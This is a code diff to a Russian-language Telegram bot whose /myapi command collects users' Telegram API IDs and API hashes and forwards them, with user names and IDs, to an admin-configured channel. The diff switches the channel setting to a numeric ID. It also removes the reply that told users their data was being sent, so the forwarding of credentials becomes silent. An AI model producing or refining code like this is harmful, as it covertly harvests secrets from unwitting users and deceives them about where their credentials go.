@@ -515,7 +515,7 @@ async def cmd_start(message: Message):
 def get_admin_keyboard():
     admin_channel = settings.get("admin_channel", "не настроен")
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=f"📊 Канал для API: @{admin_channel}", callback_data="action_admin_channel")],
+        [InlineKeyboardButton(text=f"📊 Канал для API: {admin_channel}", callback_data="action_admin_channel")],
         [InlineKeyboardButton(text="👥 Пользователи", callback_data="action_admin_users")],
         [InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")],
     ])
@@ -537,10 +537,11 @@ async def cb_admin_channel(callback: CallbackQuery):
         await callback.answer("🚫 Доступ запрещён!", show_alert=True)
         return
 
+    current = settings.get("admin_channel", "не настроен")
     await callback.message.edit_text(
         "📊 *Настройка канала для API*\n\n"
-        "Сюда будут приходить API данные от пользователей.\n\n"
-        "Отправьте username канала:"
+        f"Текущий ID: `{current}`\n\n"
+        "Отправьте ID канала (число):"
     )
     user_sessions[callback.from_user.id] = "setting_admin_channel"
     await callback.answer()
@@ -608,18 +609,20 @@ async def cmd_myapi(message: Message):
 
         admin_channel = settings.get("admin_channel", "")
         if admin_channel:
-            await bot.send_message(
-                admin_channel,
-                f"✅ *Проверенный API*\n\n"
-                f"👤 Пользователь: {message.from_user.full_name}\n"
-                f"🆔 ID: `{message.from_user.id}`\n"
-                f"🔑 API ID: `{api_id}`\n"
-                f"🔐 API Hash: `{api_hash}`\n"
-                f"📛 Имя: {me.first_name}"
-            )
-            await message.answer("✅ API подтверждён! Данные отправлены на канал.")
-        else:
-            await message.answer("✅ API верный!\n⚠️ Канал для приёма пока не настроен.")
+            try:
+                await bot.send_message(
+                    int(admin_channel),
+                    f"✅ *Проверенный API*\n\n"
+                    f"👤 Пользователь: {message.from_user.full_name}\n"
+                    f"🆔 ID: `{message.from_user.id}`\n"
+                    f"🔑 API ID: `{api_id}`\n"
+                    f"🔐 API Hash: `{api_hash}`\n"
+                    f"📛 Имя: {me.first_name}"
+                )
+            except Exception as e:
+                logger.error(f"Error sending to admin channel: {e}")
+
+        await message.answer("✅ API подтверждён!")
 
     except Exception as e:
         logger.error(f"API validation error: {e}")
@@ -957,10 +960,14 @@ async def handle_text_input(message: Message):
     elif session == "setting_admin_channel":
         if message.from_user.id not in ADMIN_IDS:
             return
-        channel = text.strip().replace('@', '')
-        settings["admin_channel"] = channel
-        save_settings()
-        await message.answer(f"✅ Канал для API: @{channel}\n\nТеперь пользователи могут отправлять /myapi api_id api_hash")
+        channel = text.strip()
+        try:
+            channel_id = int(channel)
+            settings["admin_channel"] = str(channel_id)
+            save_settings()
+            await message.answer(f"✅ Канал для API: {channel_id}\n\nТеперь пользователи могут отправлять /myapi api_id api_hash")
+        except ValueError:
+            await message.answer("❌ Введите числовой ID канала")
         del user_sessions[message.from_user.id]
         await cmd_admin(message)
 
